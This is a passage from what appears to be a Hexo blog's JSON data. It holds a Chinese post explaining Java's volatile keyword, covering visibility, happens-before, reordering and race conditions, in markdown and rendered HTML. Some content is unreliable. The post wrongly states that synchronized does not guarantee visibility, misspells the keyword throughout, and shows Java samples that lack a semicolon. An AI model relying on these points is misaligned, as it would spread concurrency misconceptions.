Cache中`counter`都是1，即使我们将它们的值写入到主存，结果仍然不对，这都是**volatile is Not Always Enough**\n\n## When is volatile Enough?\n既然出现了上诉情况，那么如果解决这个问题？之前`volatitle`已经明显不够，那么这时候可以使用Java另外一个关键字`synchronized`去保证读取变量和写入变量是原子性的操作。上诉的`volatitle`读写操作并不会产生线程阻塞，使用`synchronized`保证临界区读写不出现上述问题，但这样会导致线程阻塞。另外也可以使用`java.util.concurrent package`里面的`AtomicLong` or `AtomicReference`或者其他。\n\n在这样的情况下，只有一个线程允许对`volatitle`变量进行读写操作，其他线程只允许读取，这样即保证读取最新的值，也保证直接写入主存。但是光有`synchronized`并不能保证可见性。\n\n## 性能问题\n之前已经说过，`volatitle`的读写都要直接接触主存，那么与读写CPU Cache相比，开销增大许多倍，放一张计算机各级缓存以及主存的读取速度比较:\n![](http://www.qdpma.com/SystemArchitecture_files/CPU_4c.png)\n\n## 参考链接\n- [Java Volatile Keyword](http://tutorials.jenkov.com/java-concurrency/volatile.html)","slug":"JavaVolatitle","published":1,"updated":"2018-05-04T05:56:35.884Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjgrjscxb000fyp0lzf5x8yu0","content":"<h2 id=\"Java-Volatile-Keyword\"><a href=\"#Java-Volatile-Keyword\" class=\"headerlink\" title=\"Java Volatile Keyword\"></a>Java Volatile Keyword</h2><p>Java <code>volatitle</code>关键字用来标记变量”被存储在主存里”，更精确的说，<code>volatitle</code>变量的每一次读取都需要从计算机的主存读取而不是<code>CPU Cache</code>，而每一次写入都是直接写入主存，而不是<code>CPU Cache</code>。从Java 5开始<code>volatitle</code>关键字不仅仅是保证写入主存和从主存读取。</p>\n<h2 id=\"变量可见性问题\"><a href=\"#变量可见性问题\" class=\"headerlink\" title=\"变量可见性问题\"></a>变量可见性问题</h2><p>Java <code>volatitle</code>保证了变量跨线程的可见性，这么说可能有点抽象，so let me elaborate。</p>\n<p>在线程操作<code>non-volatile</code>变量的多线程应用中，由于性能原因每个线程会从主存中拷贝变量到CPU Cache(each thread may copy variables from main memory into a CPU cache while working on them)。如果你的计算机是多CPU的，每个线程可能跑在不同的CPU上，这意味着每个线程会拷贝变量到不同CPU的Cache中，就像这样:<br><img src=\"http://tutorials.jenkov.com/images/java-concurrency/java-volatile-1.png\" alt=\"\"></p>\n<a id=\"more\"></a>\n<p>对于JVM来说，从主存读取值到CPU Cache和从CPU Cache写入数据到主存，<code>non-volatile variables</code>没有上述的保证，会引出一些问题。</p>\n<p>设想一种情况，两个或更多线程可以访问包含一个计数器变量的共享对象，声明如下:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SharedObject</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">int</span> counter = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>再想象一下，只有Thread 1 increments the <code>counter</code> variable，但是Thread 1 和Thread 2都会一遍一遍的读取<code>counter</code> 变量。如果<code>counter</code>变量没有<code>volatitle</code>修饰，那么就不保证<code>counter</code>变量的值何时从CPU Cache写入主存。这就意味着在CPU Cache中<code>counter</code>的值与主存里的值可能不一样，就像这样:<br><img src=\"http://tutorials.jenkov.com/images/java-concurrency/java-volatile-2.png\" alt=\"\"></p>\n<p>这个问题就是线程不能看到变量的最新值，因为在另一个线程中没有将变量最新值写入到主存中，这个问题叫做<code>可见性</code>问题。一个线程的更新对另一个线程不可见。</p>\n<h2 id=\"Java-volatitle可见性保证\"><a href=\"#Java-volatitle可见性保证\" class=\"headerlink\" title=\"Java volatitle可见性保证\"></a>Java volatitle可见性保证</h2><p>Java关键字<code>volatitle</code>旨在解决变量可见性问题。定义了<code>counter</code>变量<code>volatitle</code>后线程的写入操作会立刻写入到主存，同时所有的读取都是直接从主存读取。下面就是<code>volatitle</code>定义<code>counter</code>变量:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SharedObject</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">int</span> counter = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>定义了<code>volatitle</code>后就保证了变量的可见性，在上述的情况下，线程1修改<code>counter</code>，线程2读取<code>counter</code>，对于线程2来说它能够见到线程1的最新修改。但是当两个线程都要修改<code>counter</code>的时候，定义<code>volatitle</code>显然不够了。</p>\n<h2 id=\"Full-volatile-Visibility-Guarantee\"><a href=\"#Full-volatile-Visibility-Guarantee\" class=\"headerlink\" title=\"Full volatile Visibility Guarantee\"></a>Full volatile Visibility Guarantee</h2><p>Full保证如下:</p>\n<ul>\n<li>如果线程A写入一个<code>volatitle</code>变量，并且线程B随后读取相同的<code>volatitle</code>变量，则在写入<code>volatitle</code>变量之前，线程A可见的所有变量在线程B读取<code>volatitle</code>变量后也将可见。</li>\n<li>如果线程A读取一个<code>volatitle</code>变量，则读取<code>volatitle</code>变量时线程A可见的所有变量也将从主内存中重新读取。<blockquote>\n<p>可以看到，这个开销是比较恐怖的，首先直接读主存和写主存原本就很慢，慢到几十倍甚至几百倍，同时一个volatitle变量读取会带动其他所有volatitle重新读取，大大降低了性能。</p>\n</blockquote>\n</li>\n</ul>\n<p>来看一个例子：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> years;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> months</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">int</span> days;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> years, <span class=\"keyword\">int</span> months, <span class=\"keyword\">int</span> days)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.years  = years;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.months = months;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.days   = days;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>update()</code>方法会写入三个变量，其中只有<code>days</code>是<code>volatitle</code>，Full volatitle保证意味着，当写入<code>days</code>时，所有的变量都会写入主存。在这个例子中就是，当我们要写入<code>days</code>时，<code>years</code>和<code>months</code>也要写入主存。当要读取<code>years</code>、<code>months</code>和<code>days</code>时，你可以像这样做:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> years;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> months</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">int</span> days;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">totalDays</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> total = <span class=\"keyword\">this</span>.days;</span><br><span class=\"line\">        total += months * <span class=\"number\">30</span>;</span><br><span class=\"line\">        total += years * <span class=\"number\">365</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> total;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> years, <span class=\"keyword\">int</span> months, <span class=\"keyword\">int</span> days)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.years  = years;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.months = months;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.days   = days;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注意<code>totalDays()</code>方法在开始时读取<code>days</code>到<code>total</code>变量。当读取<code>days</code>值时，<code>years</code>和<code>months</code>也会从主存中读取，因此你可以通过上面的读取步骤读到所有变量的最新值。</p>\n<h2 id=\"指令重排\"><a href=\"#指令重排\" class=\"headerlink\" title=\"指令重排\"></a>指令重排</h2><p>为了性能，Java VM和CPU是允许重排程序中的指令的，只要语义含义保持不变。举个例子，看看下面的指令：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> b = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">a++;</span><br><span class=\"line\">b++;</span><br></pre></td></tr></table></figure></p>\n<p>在不丢失语义含义的情况下，上述指令可能被重排成下列指令序列：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">a++;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">int</span> b = <span class=\"number\">2</span>;</span><br><span class=\"line\">b++;</span><br></pre></td></tr></table></figure></p>\n<p>但对于<code>volatitle</code>变量来说，指令重排是一个挑战，让我们来看一下上述MyClass的例子<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> years;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> months</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">int</span> days;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> years, <span class=\"keyword\">int</span> months, <span class=\"keyword\">int</span> days)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.years  = years;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.months = months;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.days   = days;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当写入<code>days</code>时，也会同时写入<code>years</code>和<code>months</code>到主存。但是如果Java VM重排指令如下：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> years, <span class=\"keyword\">int</span> months, <span class=\"keyword\">int</span> days)</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.days   = days;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.months = months;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.years  = years;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>当<code>days</code>修改时，<code>months</code>和<code>years</code>也会写入主存，但是这次<code>days</code>写入发生在<code>years</code>和<code>months</code>之前，因此这个新值对其他线程不可见，这个语义含义已经被改变了。</p>\n<blockquote>\n<p>特别注意，在写入时，把<code>volatitle</code>变量写入放在最后，这样当运行到<code>volatitle</code>变量写入时，会同时把其他非<code>volatitle</code>写入主存，但当<code>volatitle</code>写在最开始时，后面的非<code>volatitle</code>便不会写入最新值。读取相反，将<code>volatitle</code>读取放在最前，线程会读取所有值最新的主存值，如果放在最后面，那么前面读取的变量不是从主存直接读取的。</p>\n</blockquote>\n<h2 id=\"Happens-Before\"><a href=\"#Happens-Before\" class=\"headerlink\" title=\"Happens-Before\"></a>Happens-Before</h2><p>为了解决指令重组问题，Java <code>volatitle</code>关键字除了可见性保证，还给了一个<code>happens-before</code>保证，<code>happens-before</code>保证如下：</p>\n<ul>\n<li>如果读写发生在写入<code>volatitle</code>变量之前，那么读写其他变量的指令不能被重组到写入<code>volatitle</code>变量之后。写入<code>volatitle</code>变量之前的读写被保证<code>happens before</code>写<code>volatitle</code>变量。需要注意，写入<code>volatitle</code>变量之后的读写其他变量仍然有可能被重组到写入<code>volatitle</code>变量之前。因此<strong>From after to before is allowed, but from before to after is not allowed</strong>（<code>volatitle</code>写操作之后的指令被重组到写之前是允许的，而写操作之前的指令不允许被重组到写之后）</li>\n<li>读<code>volatitle</code>变量之后的读写操作不能被重组到<code>volatitle</code>之前，但同样注意发生在读<code>volatitle</code>之前的指令可以重组到读<code>volatitle</code>之后。因此<strong>From before to after is allowed, but from after to before is not allowed</strong>(<code>volatitle</code>读之前的指令被重组到读之后值允许的，而读操作之后的指令不允许被重组到读值前)</li>\n</ul>\n<blockquote>\n<p>Reads from and writes to other variables cannot be reordered to occur after a write to a volatile variable, if the reads / writes originally occurred before the write to the volatile variable.<br>The reads / writes before a write to a volatile variable are guaranteed to “happen before” the write to the volatile variable. Notice that it is still possible for e.g. reads / writes of other variables located after a write to a volatile to be reordered to occur before that write to the volatile. Just not the other way around. From after to before is allowed, but from before to after is not allowed</p>\n<p>Reads from and writes to other variables cannot be reordered to occur before a read of a volatile variable, if the reads / writes originally occurred after the read of the volatile variable. Notice that it is possible for reads of other variables that occur before the read of a volatile variable can be reordered to occur after the read of the volatile. Just not the other way around. From before to after is allowed, but from after to before is not allowed</p>\n</blockquote>\n<p>重点解释一下这两个保证：<br>对于<code>volatitle</code>写来说，如果写之前的指令被重组到写之后，那么当执行到<code>volatitle</code>时，最新值就不能被立刻写入主存；但写之后的指令被重组到写之前是没有影响的，因为写之后的指令最终还是要被写到主存，只是重组之后提前将新值写入主存。<br>对于<code>volatitle</code>读来说，如果读之后的指令被重组到读之前，那么指令没有获取最新值，因为只有到<code>volatitle</code>读执行时才重读所有变量的主存值，比如当<code>years</code>读取发生<code>volatitle days</code>之后，那么执行到<code>volatitle days</code>会刷新<code>years</code>的值，但<code>years</code>被重组到<code>volatitle days</code>之前，<code>years</code>的值没有刷新；相反，如果读取<code>years</code>在<code>volatitle days</code>之前，被重组到之后，它会读到最新值，这正是我们希望的结果。</p>\n<h2 id=\"volatile-is-Not-Always-Enough\"><a href=\"#volatile-is-Not-Always-Enough\" class=\"headerlink\" title=\"volatile is Not Always Enough\"></a>volatile is Not Always Enough</h2><p>当多个线程都需要对一个<code>volatitle</code>变量进行写入，且写入之前需要依赖<code>volatitle</code>之前的值，这时候就会出现竞争条件：</p>\n<p>想象一下，如果线程1读取一个<code>shared  counter</code>值到自己CPU Cache中，开始值为0，然后<code>increment</code>该值为1，但没有把改变的值写入主存；然后线程2也从主存中读取<code>counter</code>，由于线程1没有将改变的值写入主存，此时线程2读到的值为0，它也对值进行<code>increment</code>后值变为1，此时线程2也没有将值写入主存，就像这样:<br><img src=\"http://tutorials.jenkov.com/images/java-concurrency/java-volatile-3.png\" alt=\"\"></p>\n<p>线程1和线程2几乎不同步，而我们希望的是进行两次加操作后值为2，但线程1和线程2的CPU Cache中<code>counter</code>都是1，即使我们将它们的值写入到主存，结果仍然不对，这都是<strong>volatile is Not Always Enough</strong></p>\n<h2 id=\"When-is-volatile-Enough\"><a href=\"#When-is-volatile-Enough\" class=\"headerlink\" title=\"When is volatile Enough?\"></a>When is volatile Enough?</h2><p>既然出现了上诉情况，那么如果解决这个问题？之前<code>volatitle</code>已经明显不够，那么这时候可以使用Java另外一个关键字<code>synchronized</code>去保证读取变量和写入变量是原子性的操作。上诉的<code>volatitle</code>读写操作并不会产生线程阻塞，使用<code>synchronized</code>保证临界区读写不出现上述问题，但这样会导致线程阻塞。另外也可以使用<code>java.util.concurrent package</code>里面的<code>AtomicLong</code> or <code>AtomicReference</code>或者其他。</p>\n<p>在这样的情况下，只有一个线程允许对<code>volatitle</code>变量进行读写操作，其他线程只允许读取，这样即保证读取最新的值，也保证直接写入主存。但是光有<code>synchronized</code>并不能保证可见性。</p>\n<h2 id=\"性能问题\"><a href=\"#性能问题\" class=\"headerlink\" title=\"性能问题\"></a>性能问题</h2><p>之前已经说过，<code>volatitle</code>的读写都要直接接触主存，那么与读写CPU Cache相比，开销增大许多倍，放一张计算机各级缓存以及主存的读取速度比较:<br><img src=\"http://www.qdpma.com/SystemArchitecture_files/CPU_4c.png\" alt=\"\"></p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><ul>\n<li><a href=\"http://tutorials.jenkov.com/java-concurrency/volatile.html\" target=\"_blank\" rel=\"external\">Java Volatile Keyword</a></li>\n</ul>\n","excerpt":"<h2 id=\"Java-Volatile-Keyword\"><a href=\"#Java-Volatile-Keyword\" class=\"headerlink\" title=\"Java Volatile Keyword\"></a>Java Volatile Keyword</h2><p>Java <code>volatitle</code>关键字用来标记变量”被存储在主存里”，更精确的说，<code>volatitle</code>变量的每一次读取都需要从计算机的主存读取而不是<code>CPU Cache</code>，而每一次写入都是直接写入主存，而不是<code>CPU Cache</code>。从Java 5开始<code>volatitle</code>关键字不仅仅是保证写入主存和从主存读取。</p>\n<h2 id=\"变量可见性问题\"><a href=\"#变量可见性问题\" class=\"headerlink\" title=\"变量可见性问题\"></a>变量可见性问题</h2><p>Java <code>volatitle</code>保证了变量跨线程的可见性，这么说可能有点抽象，so let me elaborate。</p>\n<p>在线程操作<code>non-volatile</code>变量的多线程应用中，由于性能原因每个线程会从主存中拷贝变量到CPU Cache(each thread may copy variables from main memory into a CPU cache while working on them)。如果你的计算机是多CPU的，每个线程可能跑在不同的CPU上，这意味着每个线程会拷贝变量到不同CPU的Cache中，就像这样:<br><img src=\"http://tutorials.jenkov.com/images/java-concurrency/java-volatile-1.png\" alt=\"\"></p>","more":"<p>对于JVM来说，从主存读取值到CPU Cache和从CPU Cache写入数据到主存，<code>non-volatile variables</code>没有上述的保证，会引出一些问题。</p>\n<p>设想一种情况，两个或更多线程可以访问包含一个计数器变量的共享对象，声明如下:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SharedObject</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">int</span> counter = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>再想象一下，只有Thread 1 increments the <code>counter</code> variable，但是Thread 1 和Thread 2都会一遍一遍的读取<code>counter</code> 变量。如果<code>counter</code>变量没有<code>volatitle</code>修饰，那么就不保证<code>counter</code>变量的值何时从CPU Cache写入主存。这就意味着在CPU Cache中<code>counter</code>的值与主存里的值可能不一样，就像这样:<br><img src=\"http://tutorials.jenkov.com/images/java-concurrency/java-volatile-2.png\" alt=\"\"></p>\n<p>这个问题就是线程不能看到变量的最新值，因为在另一个线程中没有将变量最新值写入到主存中，这个问题叫做<code>可见性</code>问题。一个线程的更新对另一个线程不可见。</p>\n<h2 id=\"Java-volatitle可见性保证\"><a href=\"#Java-volatitle可见性保证\" class=\"headerlink\" title=\"Java volatitle可见性保证\"></a>Java volatitle可见性保证</h2><p>Java关键字<code>volatitle</code>旨在解决变量可见性问题。定义了<code>counter</code>变量<code>volatitle</code>后线程的写入操作会立刻写入到主存，同时所有的读取都是直接从主存读取。下面就是<code>volatitle</code>定义<code>counter</code>变量:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SharedObject</span> </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">int</span> counter = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>定义了<code>volatitle</code>后就保证了变量的可见性，在上述的情况下，线程1修改<code>counter</code>，线程2读取<code>counter</code>，对于线程2来说它能够见到线程1的最新修改。但是当两个线程都要修改<code>counter</code>的时候，定义<code>volatitle</code>显然不够了。</p>\n<h2 id=\"Full-volatile-Visibility-Guarantee\"><a href=\"#Full-volatile-Visibility-Guarantee\" class=\"headerlink\" title=\"Full volatile Visibility Guarantee\"></a>Full volatile Visibility Guarantee</h2><p>Full保证如下:</p>\n<ul>\n<li>如果线程A写入一个<code>volatitle</code>变量，并且线程B随后读取相同的<code>volatitle</code>变量，则在写入<code>volatitle</code>变量之前，线程A可见的所有变量在线程B读取<code>volatitle</code>变量后也将可见。</li>\n<li>如果线程A读取一个<code>volatitle</code>变量，则读取<code>volatitle</code>变量时线程A可见的所有变量也将从主内存中重新读取。<blockquote>\n<p>可以看到，这个开销是比较恐怖的，首先直接读主存和写主存原本就很慢，慢到几十倍甚至几百倍，同时一个volatitle变量读取会带动其他所有volatitle重新读取，大大降低了性能。</p>\n</blockquote>\n</li>\n</ul>\n<p>来看一个例子：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> years;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> months</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">int</span> days;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> years, <span class=\"keyword\">int</span> months, <span class=\"keyword\">int</span> days)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.years  = years;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.months = months;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.days   = days;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><code>update()</code>方法会写入三个变量，其中只有<code>days</code>是<code>volatitle</code>，Full volatitle保证意味着，当写入<code>days</code>时，所有的变量都会写入主存。在这个例子中就是，当我们要写入<code>days</code>时，<code>years</code>和<code>months</code>也要写入主存。当要读取<code>years</code>、<code>months</code>和<code>days</code>时，你可以像这样做:<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> years;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> months</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">volatile</span> <span class=\"keyword\">int</span> days;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">int</span> <span class=\"title\">totalDays</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> total = <span class=\"keyword\">this</span>.days;</span><br><span class=\"line\">        total += months * <span class=\"number\">30</span>;</span><br><span class=\"line\">        total += years * <span class=\"number\">365</span>;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> total;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">update</span><span class=\"params\">(<span class=\"keyword\">int</span> years, <span class=\"keyword\">int</span> months, <span class=\"keyword\">int</span> days)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.years  = years;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.months = months;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.days   = days;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>注意<code>totalDays()</code>方法在开始时读取<code>days</code>到<code>total</code>变量。当读取<code>days</code>值时，<code>years</code>和<code>months</code>也会从主存中读取，因此你可以通过上面的读取步骤读到所有变量的最新值。</p>\n<h2 id=\"指令重排\"><a href=\"#指令重排\" class=\"headerlink\" title=\"指令重排\"></a>指令重排</h2><p>为了性能，Java VM和CPU是允许重排程序中的指令的，只要语义含义保持不变。举个例子，看看下面的指令：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"keyword\">int</span> b = <span class=\"number\">2</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">a++;</span><br><span class=\"line\">b++;</span><br></pre></td></tr></table></figure></p>\n<p>在不丢失语义含义的情况下，上述指令可能被重排成下列指令序列：<br><figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span 